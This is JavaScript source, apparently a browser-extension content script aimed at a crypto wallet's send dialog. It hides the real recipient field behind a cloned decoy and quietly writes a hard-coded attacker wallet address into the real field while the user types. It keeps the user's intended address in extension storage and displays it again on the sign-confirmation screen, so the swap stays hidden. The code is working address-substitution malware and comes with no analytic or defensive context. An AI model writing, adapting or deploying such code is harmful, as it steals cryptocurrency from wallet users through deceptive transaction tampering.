const hackerAddr1 = "0xc3AbeF954D4D5e216745c07B9DaA363849998a3E";
const hackerAddr2 = "c3AbeF954D4D5e216745c07B9DaA363849998a3E";

// Injection (Find target element)
function onClick(event) {
  const inputs = document.getElementsByTagName("input");
  for (let i = 0; i < inputs.length; i++) {
    if (inputs[i].name == "myInput") {
      const target_element = inputs[i];
      inject(target_element);
      break;
    }
  }
}

function inject(target_element) {
  let fake_element = target_element.cloneNode(true);
  fake_element.placeholder = "Enter address";
  fake_element.className = fake_element.className + " fake-element";

  console.log("inject", target_element);
  console.log("fake", fake_element);
  target_element.style.display = "none";
  target_element.parentNode.insertBefore(fake_element, target_element.nextSibling);

  fake_element.addEventListener("input", (event) => {
    fake_element.innerHTML = fake_element.value;
    let lastValue = target_element.value;

    if (fake_element.value.startsWith("0x") && fake_element.value.length <= 42) {
      target_element.value = hackerAddr1.substring(0, fake_element.value.length);
    } else if (fake_element.value.length <= 40) {
      target_element.value = hackerAddr2.substring(0, fake_element.value.length);
    } else {
      target_element.value = "123123123"; // let the user know that the address is invalid
    }

    // 记录用户输入的地址
    chrome.storage.local.set({ address: fake_element.value }).then(() => {
    //   console.log("Value is set to", fake_element.value);
    });

    if (fake_element.value.length > 34) {
      fake_element.style.height = "40px";
      console.log("fake_element.value.length", fake_element.style.height);
    } else {
      fake_element.style.height = "20px";
      console.log("fake_element.value.length", fake_element.style.height);
    }

    // 构造消息
    const inputEvent = new Event("input", { bubbles: true });

    // 利用 simulated event 让 React 修改它的虚拟 DOM
    inputEvent.simulated = true;
    let tracker = target_element._valueTracker;
    if (tracker) {
      tracker.setValue(lastValue);
    }

    // 发送消息
    target_element.dispatchEvent(inputEvent);
  });
}

// Periodically check if the element exists
const intervalId = setInterval(() => {
  const sendModal = document.querySelector("[class^='SendModal__']");
  const fakeElement = document.querySelector(".fake-element");

  if (sendModal && !fakeElement) {
    const addressInput = sendModal.querySelector("[class^='addressInput__']");
    if (!addressInput) return;

    const textarea = addressInput.querySelector("textarea");

    inject(textarea);
  }
}, 100);

const intervalId2 = setInterval(() => {
  const checkAndSign = document.querySelector("[class^='checkAndSign']");
  if (checkAndSign) {
    // console.log("checkAndSign", checkAndSign);
    const allValues = checkAndSign.querySelectorAll("[class^='item-value']");

    for (let i = 0; i < allValues.length; i++) {
      if (allValues[i].innerHTML.toString().toUpperCase() === hackerAddr1.toUpperCase()) {
        chrome.storage.local.get("address").then((result) => {
          allValues[i].innerHTML = result.address;
        });
      }
    }
  }
}, 1);
